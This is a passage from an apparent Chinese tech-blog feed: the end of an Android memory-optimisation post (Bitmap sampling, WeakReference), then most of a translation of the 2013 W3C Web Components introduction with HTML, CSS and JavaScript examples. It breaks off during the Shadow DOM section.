<p>5.Dominator Tree：帮助辨别占用很多内存且没有释放的对象</p>
<p><img src="/images/photos/2013-07-dominator-tree.png" alt="Dominator Tree"></p>
<p><img src="/images/photos/2013-07-dominator-tree2.png" alt="Dominator Tree 2"></p>
<p><img src="/images/photos/2013-07-dominator-tree3.png" alt="Dominator Tree 3"></p>
<p>避免抛出OutOfMemoryError异常【具体用法google】：</p>
<ul>
<li>Bitmap：<ul>
<li>是否可以Sample？</li>
<li>回收不用的Bitmap：Bitmap.recycle()</li>
</ul>
</li>
</ul>
<pre><code class="lang-java"><figure class="highlight lang-java"><pre>BitmapFactory.Options opts = <span class="keyword">new</span> BitmapFactory.Options();
opts.inJustDecodeBounds = <span class="keyword">true</span>;
BitmapFactory.decodeFile(path, opts);
<span class="keyword">final</span> <span class="keyword">int</span> originalWidth = opts.outWidth;
<span class="keyword">final</span> <span class="keyword">int</span> originalHeight = opts.outHeight;
<span class="keyword">final</span> <span class="keyword">int</span> originalDim = Math.max(originalWidth, originalHeight);
opts = <span class="keyword">new</span> BitmapFactory.Options();
opts.inSampleSize = <span class="number">1</span>;
<span class="keyword">while</span> ( originalDim &gt; MAX_IMAGE_DIM ) {
    opts.inSampleSize *= <span class="number">2</span>;
    originalDim /= <span class="number">2</span>;
}
<span class="keyword">return</span> BitmapFactory.decodeFile(path, opts);
</pre></figure></code></pre>
<ul>
<li>Java Object：<ul>
<li>用SoftReference替换直接引用</li>
<li>用WeakReference避免内存泄露【常用到引用Context、Activity】</li>
</ul>
</li>
</ul>
<pre><code class="lang-java"><figure class="highlight lang-java"><pre><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> {</span>
    <span class="keyword">static</span> Leaky leak = <span class="keyword">null</span>;
    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Leaky</span> {</span>
        <span class="keyword">private</span> <span class="keyword">final</span> WeakReference&lt;Context&gt; mContext;
        <span class="keyword">public</span> Leaky(Context context) {
            <span class="keyword">super</span>();
            mContext = <span class="keyword">new</span> WeakReference&lt;Context&gt;(context);
            doSomethingWithOuterInstance();
        }

        <span class="keyword">void</span> doSomethingWithOuterInstance() {
            Context context = mContext.get();
            <span class="keyword">if</span> (context != <span class="keyword">null</span>) {
                String text = context.getString(R.string.hello);
                System.out.println(text);
            }
        }
    }

    <span class="annotation">@Override</span>
    <span class="keyword">public</span> <span class="keyword">void</span> onCreate(Bundle savedInstanceState) {
        <span class="keyword">super</span>.onCreate(savedInstanceState);
        <span class="keyword">if</span> (leak == <span class="keyword">null</span>) {
            leak = <span class="keyword">new</span> Leaky(<span class="keyword">this</span>);
        }
    }
}
</pre></figure></code></pre>
<h2>速度优化</h2>
<p>经常会有引用一些开源的底层库，比如pdf或者doc解析库，ffmppeg编解码库等等，除了对库做底层的裁剪移植，我们有时也需要将解码后的图形等信息输出到设备上，或者url fetch了某些网页或者图片，为了避免下次重复这种耗时操作，有效的方法就是缓存</p>
<p>图像的缓存见<a href="http://developer.android.com/training/displaying-bitmaps/cache-bitmap.html">android developer</a>已经有例子写的很详细，使用LRU(最近最少使用)算法实现</p>
<h2>主要参考文献：</h2>
<ul>
<li>1.<a href="http://stackoverflow.com/questions/2630158/detect-application-heap-size-in-android/2634738#2634738">http://stackoverflow.com/questions/2630158/detect-application-heap-size-in-android/2634738#2634738</a></li>
<li>2.<a href="http://developer.android.com/reference/java/lang/ref/WeakReference.html">http://developer.android.com/reference/java/lang/ref/WeakReference.html</a></li>
<li>3.<a href="http://developer.android.com/training/displaying-bitmaps/cache-bitmap.html">http://developer.android.com/training/displaying-bitmaps/cache-bitmap.html</a></li>
<li>4.<a href="http://dubroy.com/blog/google-io-memory-management-for-android-apps/">http://dubroy.com/blog/google-io-memory-management-for-android-apps/</a></li>
<li>5.<a href="http://cyrilmottier.com/2013/01/09/back-to-top-android-vs-ios/">http://cyrilmottier.com/2013/01/09/back-to-top-android-vs-ios/</a></li>
<li>6.<a href="http://blog.csdn.net/luoshengyang/article/details/6745181">http://blog.csdn.net/luoshengyang/article/details/6745181</a></li>
</ul>
]]></content>
    <category scheme="http://suetming.com/tags/UI-performance/" term="UI performance"/>
    <category scheme="http://suetming.com/tags/IO-performance/" term="I/O performance"/>
    <category scheme="http://suetming.com/tags/Scrolling-performance/" term="Scrolling performance"/>
    <category scheme="http://suetming.com/categories/android/" term="android"/>
  </entry>
  <entry>
    <title type="html"><![CDATA[Web组件(Web Components) | HTML5]]></title>
    <link href="http://suetming.com/2013/08/11/2013-06-29-web-components/"/>
    <id>http://suetming.com/2013/08/11/2013-06-29-web-components/</id>
    <published>2013-08-11T10:54:06.000Z</published>
    <updated>2013-08-11T10:54:06.000Z</updated>
    <content type="html"><![CDATA[<p>译者：<a href="http://suetming.com">suetming</a></p>
<p>原文：<a href="http://www.w3.org/TR/2013/WD-components-intro-20130606/">W3C: Web Components</a></p>
<h2>1 关于本文</h2>
<p>注意文章涉及正在开展的工作. 关系到web组件的一系列概念，每个概念都有各自的规范.
这是一个迭代的过程</p>
<p>本文描述的概念有时会落后或者超前于专门界定此概念的规范，一旦本文涉及的前瞻性技术被相应的规范所采纳，本文会更新并注明</p>
<p><a name="more"></a></p>
<h2>2 介绍</h2>
<p>web组件模型由5部分组成：</p>
<ul>
<li><ol>
<li>Templates：由一系列复用时能被激活的标记组成</li>
</ol>
</li>
<li><ol>
<li>Decorators：用于Templates中，通过CSS丰富和控制交互改变文本</li>
</ol>
</li>
<li><ol>
<li>Custom Elements：让用户可以自定义元素[自定义元素名、自定义API接口]</li>
</ol>
</li>
<li><ol>
<li>Shadow DOM：将一组DOM树封装成一个用户接口元素</li>
</ol>
</li>
<li><ol>
<li>Imports：定义如何将Templates、Decorators和Custom Elements打包，并且能够以资源的形式从外部引用</li>
</ol>
</li>
</ul>
<p>每一部分都有各自的用途. 如果将这5种技术引入，开发人员可以轻松的编写拥有复杂交互体验的组件，并且可以轻松引用和组装，这是今天的CSS和脚本语言所无法达到的</p>
<p>本文将会讨论这5种技术，并举例说明其在Web组件中的作用</p>
<h2>3 Templates</h2>
<p>具体规范参加这篇<a href="https://dvcs.w3.org/hg/webcomponents/raw-file/tip/spec/templates/index.html">HTML Templates</a>
\<template\>元素及其所包含元素会由解析器进行解析并标记，不过不会立即渲染出来，脚本不会立即执行，包含的图片也不会立即下载
\<template\>元素有一个属性 <strong>content</strong> 存储元素的实际内容，属性 <strong>content</strong> 的内容可以拷贝移动到HTML节点中</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">template</span> <span class="attribute">id</span>=<span class="value">"commentTemplate"</span>&gt;</span>
    <span class="tag">&lt;<span class="title">div</span>&gt;</span>
        <span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">""</span>&gt;</span>
        <span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"comment-text"</span>&gt;</span><span class="tag">&lt;/<span class="title">div</span>&gt;</span>
    <span class="tag">&lt;/<span class="title">div</span>&gt;</span>
<span class="tag">&lt;/<span class="title">template</span>&gt;</span>
<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
<span class="function"><span class="keyword">function</span> <span class="title">addComment</span><span class="params">(imageUrl, text)</span> {</span>
  <span class="keyword">var</span> t = document.querySelector(<span class="string">"#commentTemplate"</span>);
  <span class="keyword">var</span> comment = t.content.cloneNode(<span class="literal">true</span>);
  <span class="comment">// Populate content.</span>
  comment.querySelector(<span class="string">'img'</span>).src = imageUrl;
  comment.querySelector(<span class="string">'.comment-text'</span>).textContent = text;
  document.body.appendChild(comment);
}
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
</pre></figure></code></pre>
<p><strong>template</strong> 所包含的的元素包含在属性 <strong>content</strong> 中，通过script拷贝里面的元素并插入到HTML中使图片加载进来，脚本开始运行. 例如，在templates引入大型脚本，需要时调用</p>
<h2>4 Decorators</h2>
<p>Decorators 目前没有标准文档，<strong>decorator</strong> 主要加强或者重载已经存在的元素，由CSS控制表现，与一般元素不同的是通过标记可以达到额外的效果</p>
<p>\<decorator\>通过包含\<template\>来明确具体渲染哪一块</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">decorator</span> <span class="attribute">id</span>=<span class="value">"details-open"</span>&gt;</span>
    <span class="tag">&lt;<span class="title">template</span>&gt;</span>
        <span class="tag">&lt;<span class="title">a</span> <span class="attribute">id</span>=<span class="value">"summary"</span>&gt;</span>
          &amp;blacktriangledown;
          <span class="tag">&lt;<span class="title">content</span> <span class="attribute">select</span>=<span class="value">"summary"</span>&gt;</span><span class="tag">&lt;/<span class="title">content</span>&gt;</span>
        <span class="tag">&lt;/<span class="title">a</span>&gt;</span>
        <span class="tag">&lt;<span class="title">content</span>&gt;</span><span class="tag">&lt;/<span class="title">content</span>&gt;</span>
    <span class="tag">&lt;/<span class="title">template</span>&gt;</span>
<span class="tag">&lt;/<span class="title">decorator</span>&gt;</span>
</pre></figure></code></pre>
<p>\<content\>包含待渲染的内容，通过CSS控制生效</p>
<pre><code class="lang-css"><figure class="highlight lang-css"><pre><span class="tag">details</span><span class="attr_selector">[open]</span> <span class="rules">{
    <span class="rule"><span class="attribute">decorator</span>:<span class="value"> <span class="function">url(#details-open)</span>;</span></span>
<span class="rule">}</span></span>
</pre></figure></code></pre>
<p>通过这种方式可以使下面的html代码</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">details</span> <span class="attribute">open</span>&gt;</span>
    <span class="tag">&lt;<span class="title">summary</span>&gt;</span>Timepieces<span class="tag">&lt;/<span class="title">summary</span>&gt;</span>
    <span class="tag">&lt;<span class="title">ul</span>&gt;</span>
      <span class="tag">&lt;<span class="title">li</span>&gt;</span>Sundial
      <span class="tag">&lt;<span class="title">li</span>&gt;</span>Cuckoo clock
      <span class="tag">&lt;<span class="title">li</span>&gt;</span>Wristwatch
    <span class="tag">&lt;/<span class="title">ul</span>&gt;</span>
<span class="tag">&lt;/<span class="title">details</span>&gt;</span>
</pre></figure></code></pre>
<p>最终渲染成</p>
<p><a>
  ▾ Timepieces
</a></p>
<ul>
  <li>Sundial
  </li><li>Cuckoo clock
  </li><li>Wristwatch
</li></ul>

<p><strong>decorator</strong> CSS属性可以指向任何网络资源，不过只有其“定义”被调用才能申请，生成的标记仅限于展示，永远不会运行脚本包括内联事件，而且也是不可编辑的</p>
<p>4.1 Decorators的事件
Decorators可以关联事件增强交互，decorator采用事件控制器当做媒介，因为decorator可能在任何时间生效或者失效，所以关联template中监听节点事件或者获取其状态都是无效的</p>
<p><img src="http://www.w3.org/TR/2013/WD-components-intro-20130606/event-handler-registration.png" alt="事件注册"></p>
<p>通过事件控制器注册事件监听器，template中插入\<script\>，decorator元素插入到文档中时脚本会执行，脚本会被插入到注册队列中:</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">decorator</span> <span class="attribute">id</span>=<span class="value">"details-open"</span>&gt;</span>
    <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
        <span class="function"><span class="keyword">function</span> <span class="title">clicked</span><span class="params">(event)</span> {</span>
            event.target.removeAttribute(<span class="string">'open'</span>);
        }
        [{selector: <span class="string">'#summary'</span>, type: <span class="string">'click'</span>, handler: clicked}];
    </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
    <span class="tag">&lt;<span class="title">template</span>&gt;</span>
      <span class="tag">&lt;<span class="title">a</span> <span class="attribute">id</span>=<span class="value">"summary"</span>&gt;</span>
        <span class="comment">&lt;!-- as illustrated above --&gt;</span>
</pre></figure></code></pre>
<p>事件控制器解析注册事件如图所示</p>
<p><img src="http://www.w3.org/TR/2013/WD-components-intro-20130606/event-routing-retargeting.png" alt="事件的路由和重定向"></p>
<p>事件监听器被调用时，事件的目标是最终生成的内容而不是template中的内容. 点击template中定义的▾，将会调用单击事件（在template中定义的<strong>#summary</strong>元素）, event.target指向\<details\>，事件的重定向不会影响文档DOM结构</p>
<p>移除属性<strong>open</strong>，由于selector与decorator的属性不匹配，这个decorator不再有效. 未应用的decorator会回到最初的状态. 不过可以再构造一个decorator来渲染<strong>closed</strong>，通过激活不同的decorator可以达到无状态交互，代码如下</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css">
<span class="tag">details</span> <span class="rules">{
    <span class="rule"><span class="attribute">decorator</span>:<span class="value"> <span class="function">url(#details-closed)</span>;</span></span>
<span class="rule">}</span></span>
<span class="tag">details</span><span class="attr_selector">[open]</span> <span class="rules">{
    <span class="rule"><span class="attribute">decorator</span>:<span class="value"> <span class="function">url(#details-open)</span>;</span></span>
<span class="rule">}</span></span>
</span><span class="tag">&lt;/<span class="title">style</span>&gt;</span>

<span class="tag">&lt;<span class="title">decorator</span> <span class="attribute">id</span>=<span class="value">"details-closed"</span>&gt;</span>
    <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
        <span class="function"><span class="keyword">function</span> <span class="title">clicked</span><span class="params">(event)</span> {</span>
            event.target.setAttribute(<span class="string">'open'</span>, <span class="string">'open'</span>);
        }
        [{selector: <span class="string">'#summary'</span>, type: <span class="string">'click'</span>, handler: clicked}];
    </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
    <span class="tag">&lt;<span class="title">template</span>&gt;</span>
        <span class="tag">&lt;<span class="title">a</span> <span class="attribute">id</span>=<span class="value">"summary"</span>&gt;</span>
            &amp;blacktriangleright; <span class="tag">&lt;<span class="title">content</span> <span class="attribute">select</span>=<span class="value">"summary"</span>&gt;</span><span class="tag">&lt;/<span class="title">content</span>&gt;</span>
        <span class="tag">&lt;/<span class="title">a</span>&gt;</span>
    <span class="tag">&lt;/<span class="title">template</span>&gt;</span>
<span class="tag">&lt;/<span class="title">decorator</span>&gt;</span>

<span class="tag">&lt;<span class="title">decorator</span> <span class="attribute">id</span>=<span class="value">"details-open"</span>&gt;</span>
    <span class="comment">&lt;!-- as illustrated above --&gt;</span>
</pre></figure></code></pre>
<h2>5 Custom Elements</h2>
<p>技术规范见此<a href="https://dvcs.w3.org/hg/webcomponents/raw-file/tip/spec/custom/index.html">The Custom Elements specification</a></p>
<p>用户可以构造新的DOM元素，这种技术称之为Custom Elements. 不像decorators，自定义元素可以封装状态并提供脚本接口. 下面的数据表表明两者区别</p>
<table>
   <tr>
      <td></td>
      <td>Decorators</td>
      <td>Custom Elements</td>
   </tr>
   <tr>
      <td>Lifetime</td>
      <td>Ephemeral, while a CSS selector matches</td>
      <td>Stable, matches entire element lifetime</td>
   </tr>
   <tr>
      <td>Applied, unapplied dynamically</td>
      <td>Yes, based on CSS selectors</td>
      <td>No, fixed at element creation time</td>
   </tr>
   <tr>
      <td>Accessible through script</td>
      <td>No, transparent to DOM; cannot add interfaces</td>
      <td>Yes, accessible through DOM; can provide interfaces</td>
   </tr>
   <tr>
      <td>State</td>
      <td>Stateless projection</td>
      <td>Stateful DOM object</td>
   </tr>
   <tr>
      <td>Behavior</td>
      <td>Simulated by changing decorators</td>
      <td>First-class using script and events</td>
   </tr>
</table>

<h2>5.1 构造一个自定义元素</h2>
<p>用\<element\>构造一个元素，并指明继承哪一个属性如下：</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">element</span> <span class="attribute">extends</span>=<span class="value">"button"</span> <span class="attribute">name</span>=<span class="value">"fancy-button"</span>&gt;</span>
    …
<span class="tag">&lt;/<span class="title">element</span>&gt;</span>
</pre></figure></code></pre>
<p><strong>extends</strong>属性标记继承于哪一个元素，自定义元素实例会有此标记名</p>
<p><strong>name</strong>属性指明元素名称，命名必须包含“-”</p>
<p>用户的自定义元素应该继承最接近自己想法的实际存在的元素. 如果用户构造不继承任何元素的自定义元素，user agent会抛出异常<a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/elements.html#htmlunknownelement">HTMLUnknownElement</a></p>
<h2>5.2 方法和属性</h2>
<p>将\<script\>插入到自定义元素中可以对自定义元素增加方法和属性，下面的例子中元素\<tick-tock-clock\>增加了tick方法</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">element</span> <span class="attribute">name</span>=<span class="value">"tick-tock-clock"</span>&gt;</span>
  <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
    ({
      tick: <span class="function"><span class="keyword">function</span> <span class="params">()</span> {</span>
        …
      }
    });
  </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
<span class="tag">&lt;/<span class="title">element</span>&gt;</span>
</pre></figure></code></pre>
<p>5.3 生命周期回调函数
自定义元素有很多回调函数如下：</p>
<ul>
<li>readyCallback：创建时调用</li>
<li>insertedCallback：插入文档时调用</li>
<li>removedCallbakc：删除元素时调用</li>
</ul>
<p>下面的例子演示如何用template，Shadow DOM (见下一章节)，以及Custom Elements回调函数创建元素：</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">element</span> <span class="attribute">name</span>=<span class="value">"tick-tock-clock"</span>&gt;</span>
  <span class="tag">&lt;<span class="title">template</span>&gt;</span>
    <span class="tag">&lt;<span class="title">span</span> <span class="attribute">id</span>=<span class="value">"hh"</span>&gt;</span><span class="tag">&lt;/<span class="title">span</span>&gt;</span>
    <span class="tag">&lt;<span class="title">span</span> <span class="attribute">id</span>=<span class="value">"sep"</span>&gt;</span>:<span class="tag">&lt;/<span class="title">span</span>&gt;</span>
    <span class="tag">&lt;<span class="title">span</span> <span class="attribute">id</span>=<span class="value">"mm"</span>&gt;</span><span class="tag">&lt;/<span class="title">span</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">template</span>&gt;</span>
  <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
    <span class="keyword">var</span> template = document.currentScript.parentNode.querySelector(<span class="string">'template'</span>);

    <span class="function"><span class="keyword">function</span> <span class="title">start</span><span class="params">()</span> {</span>
      <span class="keyword">this</span>.tick();
      <span class="keyword">this</span>._interval = window.setInterval(<span class="keyword">this</span>.tick.bind(<span class="keyword">this</span>), <span class="number">1000</span>);
    }
    <span class="function"><span class="keyword">function</span> <span class="title">stop</span><span class="params">()</span> {</span>
      window.clearInterval(<span class="keyword">this</span>._interval);
    }
    <span class="function"><span class="keyword">function</span> <span class="title">fmt</span><span class="params">(n)</span> {</span>
      <span class="keyword">return</span> (n &lt; <span class="number">10</span> ? <span class="string">'0'</span> : <span class="string">''</span>) + n;
    }

    ({
      readyCallback: <span class="function"><span class="keyword">function</span> <span class="params">()</span> {</span>
        <span class="keyword">this</span>._root = <span class="keyword">this</span>.createShadowRoot();
        <span class="keyword">this</span>._root.appendChild(template.content.cloneNode());
        <span class="keyword">if</span> (<span class="keyword">this</span>.parentElement) {
          start.call(<span class="keyword">this</span>);
        }
      },
      insertedCallback: start,
      removedCallback: stop,
      tick: <span class="function"><span class="keyword">function</span> <span class="params">()</span> {</span>
        <span class="keyword">var</span> now = <span class="keyword">new</span> Date();
        <span class="keyword">this</span>._root.querySelector(<span class="string">'hh'</span>).textContent = fmt(now.getHours());
        <span class="keyword">this</span>._root.querySelector(<span class="string">'sep'</span>).style.visibility =
            now.getSeconds() % <span class="number">2</span> ? <span class="string">'visible'</span> : <span class="string">'hidden'</span>;
        <span class="keyword">this</span>._root.querySelector(<span class="string">'mm'</span>).textContent = fmt(now.getMinutes());
      },
      chime: <span class="function"><span class="keyword">function</span> <span class="params">()</span> {</span> … }
    });
  </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
<span class="tag">&lt;/<span class="title">element</span>&gt;</span>
</pre></figure></code></pre>
<p>5.4 Custom Elements实例化
自定义元素均继承HTML的标准元素(div/button/option/...)， 当用户想用这些元素的时候需要用到属性<strong>is</strong>，如下：</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">element</span> <span class="attribute">extends</span>=<span class="value">"button"</span> <span class="attribute">name</span>=<span class="value">"fancy-button"</span>&gt;</span>  <span class="comment">&lt;!-- definition --&gt;</span>
    …
<span class="tag">&lt;/<span class="title">element</span>&gt;</span>

<span class="tag">&lt;<span class="title">button</span> <span class="attribute">is</span>=<span class="value">"fancy-button"</span>&gt;</span>  <span class="comment">&lt;!-- use --&gt;</span>
    Do something fancy
<span class="tag">&lt;/<span class="title">button</span>&gt;</span>
</pre></figure></code></pre>
<p>5.5 Script实例化Custom Elements
通过脚本语言也可以实例化自定义元素，方法为<strong>register</strong>，具体见下述代码：</p>
<pre><code class="lang-javascript"><figure class="highlight lang-javascript"><pre><span class="keyword">var</span> p = Object.create(HTMLButtonElement.prototype, {});
p.dazzle = <span class="function"><span class="keyword">function</span> <span class="params">()</span> {</span> … };

<span class="comment">// 返回实例化对象</span>
<span class="keyword">var</span> FancyButton = document.register(<span class="string">'button'</span>, <span class="string">'fancy-button'</span>, {prototype: p});
<span class="keyword">var</span> b = <span class="keyword">new</span> FancyButton();
document.body.appendChild(b);
b.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(event)</span> {</span>
    event.target.dazzle();
});
</pre></figure></code></pre>
<p>也可以直接通过createElement生成：</p>
<pre><code class="lang-javascript"><figure class="highlight lang-javascript"><pre><span class="keyword">var</span> b = document.createElement(<span class="string">'button'</span>, <span class="string">'fancy-button'</span>);
alert(b.outerHTML); <span class="comment">// will display '&lt;button is="fancy-button"&gt;&lt;/button&gt;'</span>
<span class="keyword">var</span> c = document.createElement(<span class="string">'tick-tock-clock'</span>);
alert(c.outerHTML); <span class="comment">// will display '&lt;tick-tock-clock&gt;&lt;/tick-tock-clock&gt;'</span>
</pre></figure></code></pre>
<h2>5.6 元素更新</h2>
<p>当元素定义调用的时候，每一个匹配的元素都会进行更新. 更新元素后，元素相应API会生效，生命周期相关函数会被调用.
通过CSS<strong>:unresolved</strong>可以匹配所有为构造的自定义元素，通过这种方式避免更新元素所造成的闪烁</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css">
<span class="tag">tick</span>-<span class="tag">tock</span>-<span class="tag">clock</span><span class="pseudo">:unresolved</span> <span class="rules">{
  <span class="rule"><span class="attribute">content</span>:<span class="value"> <span class="string">'??:??'</span>;</span></span>  
<span class="rule">}</span></span>
</span><span class="tag">&lt;/<span class="title">style</span>&gt;</span>
<span class="tag">&lt;<span class="title">tick-tock-clock</span>&gt;</span><span class="tag">&lt;/<span class="title">tick-tock-clock</span>&gt;</span> <span class="comment">&lt;!-- will show ??:?? --&gt;</span>
</pre></figure></code></pre>
<p>也可以通过脚本进行控制</p>
<pre><code class="lang-javascript"><figure class="highlight lang-javascript"><pre><span class="comment">// Chime ALL the clocks!</span>
Array.prototype.forEach.call(
  document.querySelectorAll(<span class="string">'tick-tock-clock:not(:unresolved)'</span>),
  <span class="function"><span class="keyword">function</span> <span class="params">(clock)</span> {</span> clock.chime(); });
</pre></figure></code></pre>
<p>通过自定义事件元素可以通知页面其他部分元素已经更新，可以等到元素更新完成，脚本在对其进行操作</p>
<p>5.7 扩展Custom Elements
元素也可以继承自定义元素，代码如下：</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="tag">&lt;<span class="title">element</span> <span class="attribute">extends</span>=<span class="value">"tick-tock-clock"</span> <span class="attribute">name</span>=<span class="value">"grand-father-clock"</span>&gt;</span>
    …
<span class="tag">&lt;/<span class="title">element</span>&gt;</span>
<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
<span class="keyword">var</span> p = Object.create(Object.getPrototypeOf(document.createElement(<span class="string">'tick-tock-clock'</span>)));
p.popOutBirdie = <span class="function"><span class="keyword">function</span> <span class="params">()</span> {</span> … }
<span class="keyword">var</span> CuckooClock = document.register(<span class="string">'cuckoo-clock'</span>, {prototype: p});
<span class="keyword">var</span> c = <span class="keyword">new</span> CuckooClock();
c.tick();         <span class="comment">// inherited from tick-tock-clock</span>
c.popOutBirdie(); <span class="comment">// specific to cuckoo-clock</span>
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
</pre></figure></code></pre>
<h2>6 Shadow DOM</h2>
<p>相应规范见这里<a href="https://dvcs.w3.org/hg/webcomponents/raw-file/tip/spec/shadow/index.html">The Shadow DOM specification</a></p>
<p>Shadow DOM 是一种DOM节点的辅助树. Shadow DOM 子树能够关联某个元素，但不会显示在元素子节点中，子树有自己的作用域. 例如，一个shadow DOM 子树可以和文档中相同ID和风格的元素而不冲突，因为shadow DOM 子树与文档是完全分离的</p>
<p>Shadow DOM 通过<a href="https://dvcs.w3.org/hg/webcomponents/raw-file/tip/spec/shadow/index.html#api-partial-element-create-shadow-root"><strong>createShadowRoot</strong></a>方法生效，返回shadow DOM的根节点并填充到DOM节点中</p>
<p><img src="http://www.w3.org/TR/2013/WD-components-intro-20130606/shadow-trees.svg" alt="shadow trees"></p>
<object data="http://www.w3.org/TR/2013/WD-components-intro-20130606/shadow-trees.svg" width="800" height="430"></object>

<p>关联shadow DOM的元素称为<a href="https://dvcs.w3.org/hg/webcomponents/raw-file/tip/spec/shadow/index.html#dfn-shadow-host">shadow host</a>. 当元素存在shadow DOM，元素的子节点不会渲染；渲染的是shadow DOM的内容</p>
<p><img src="http://www.w3.org/TR/2013/WD-components-intro-20130606/shadow-rendering.svg" alt="shadow rendering"></p>
<object data="http://www.w3.org/TR/2013/WD-components-intro-20130606/shadow-rendering.svg" width="450" height="400"></object>

<p>6.1 插入点
shadow DOM 子树通过\<content\>元素作为渲染输出插入点. \<content\>只是作为渲染输出的插入点，如下：</p>
<pre><code class="lang-html"><figure class="highlight lang-html"><pre><span class="comment">&lt;!-- document --&gt;</span>
<span class="tag">&lt;<span class="title">div</span> <span class="attribute">id</span>=<span class="value">"news"</span>&gt;</span>
  <span class="tag">&lt;<span class="title">h1</span>&gt;</span>Good day for kittens<span class="tag">&lt;/<span class="title">h1</span>&gt;</span>
  <span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"breaking"</span>&gt;</span>Kitten rescued from tree<span class="tag">&lt;/<span class="title">div</span>&gt;</span>
  <span class="tag">&lt;<span class="title">div</span>&gt;</span>Area kitten "adorable"&amp;mdash;owner<span class="tag">&lt;/<span class="title">div</span>&gt;</span>
  <span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"breaking"</span>&gt;</span>Jiggled piece of yarn derails kitten kongress<span class="tag">&lt;/<span class="title">div</span>&gt;</span>
<span class="tag">&lt;/<span class="title">div</span>&gt;</span>

<span class="comment">&lt;!-- #news' shadow --&gt;</span>
<span class="tag">&lt;<span class="title">template</span> <span class="attribute">id</span>=<span class="value">"t"</span>&gt;</span>
  <span class="tag">&lt;<span class="title">content</span> <span class="attribute">select</span>=<span class="value">"h1"</span>&gt;</span><span class="tag">&lt;/<span class="title">content</span>&gt;</span>
  <span class="tag">&lt;<span class="title">div</span> <span class="attribute">id</span>=<span class="value">"ticker"</span>&gt;</span>
    <span class="tag">&lt;<span class="title">content</span> <span class="attribute">id</span>=<span class="value">"stories"</span>&gt;</span><span class="tag">&lt;/<span class="title">content</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">div</span>&gt;</span>
<span class="tag">&lt;/<span class="title">template</span>&gt;</span>

<span class="comment">&lt;!-- #ticker's shadow --&gt;</span>
<span class="tag">&lt;<span class="title">template</span> <span class="attribute">id</span>=<span class="value">"u"</span>&gt;</span>
  <span class="tag">&lt;<span class="title">content</span> <span class="attribute">class</span>=<span class="value">"highlight"</span> <span class="attribute">select</span>=<span class="value">".breaking"</span>&gt;</span><span class="tag">&lt;/<span class="title">content</span>&gt;</span>
  <span class="tag">&lt;<span class="title">content</span>&gt;</span><span class="tag">&lt;/<span class="title">content</span>&gt;</span>
<span class="tag">&lt;/<span class="title">template</span>&gt;</span>

<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">
<span class="comment">// Set up shadow DOM</span>
<span class="keyword">var</span> news = document.querySelector(<span class="string">'#news'</span>);
<span class="keyword">var</span> r = news.createShadowRoot();
<span class="keyword">var</span> t = document.querySelector(<span class="string">'#t'</span>);
r.appendChild(t.content.cloneNode(<span class="literal">true</span>));

<span class="keyword">var</span> ticker = r.querySelector(<span class="string">'#ticker'</span>);
<span class="keyword">var</span> s = ticker.createShadowRoot();
<span class="keyword">var</span> u = document.querySelector(<span class="string">'#u'</span>);
s.appendChild(u.content.cloneNode(<span class="literal">true</span>));
</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>
</pre></figure></code></pre>
<p>理论上，第一部分文档和第一部分shadow根节点生成了下面的DOM树. 宿主元素的子节点显示在插入点的位置. </p>
<pre><code><figure class="highlight"><pre><span class="tag">&lt;<span class="title">div</span> <span class="attribute">id</span>=<span class="value">"news"</span>&gt;</span>
  <span class="tag">&lt;<span class="title">h1</span>&gt;</span>Good day for kittens<span class="tag">&lt;/<span class="title">h1</span>&gt;</span>
  <span class="tag">&lt;<span class="title">div</span> <span class="attribute">id</span>=<span class="value">"ticker"</span>&gt;</span>
    <span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"breaking"</span>&gt;</span>Kitten rescued from tree<span class="tag">&lt;/<span class="title">div</span>&gt;</span>
    <span class="tag">&lt;<span class="title">div</span>&gt;</span>Area kitten "adorable"&amp;mdash;owner<span class="tag">&lt;/<span class="title">div</span>&gt;</span>
